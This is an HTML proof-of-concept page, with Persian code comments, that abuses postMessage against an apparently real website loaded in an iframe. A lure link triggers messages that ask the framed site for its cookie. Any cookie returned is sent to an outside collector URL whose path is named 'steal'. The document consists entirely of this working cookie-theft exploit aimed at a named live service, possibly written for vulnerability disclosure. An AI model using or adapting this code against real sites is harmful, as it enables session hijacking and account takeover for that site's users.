<!DOCTYPE html>
<html>
<head>
    <title>PoC - PostMessage Abuse</title>
</head>
<body>
    <a href="#" id="clickBtn">Click here to continue</a>
    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');
        const btn = document.getElementById('clickBtn');

        btn.addEventListener('click', function (e) {
            e.preventDefault();

            // ۱. به iframe پیام بفرست تا URL رو تغییر بده
            iframe.contentWindow.postMessage({
                type: 'IFRAME_URL_CHANGED',
                url: 'https://www.google.com'
            }, '*');

            // ۲. از iframe درخواست کوکی کن
            iframe.contentWindow.postMessage({
                type: 'GET_COOKIE'
            }, '*');

            // ۳. گوش کن تا کوکی بیاد
            window.addEventListener('message', function (e) {
                if (e.data && e.data.type === 'COOKIE_RESPONSE') {
                    console.log('Cookie received:', e.data.cookie);
                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(e.data.cookie));
                    alert('Cookie sent to listener!');
                }
            });
        });
    </script>
</body>
</html>
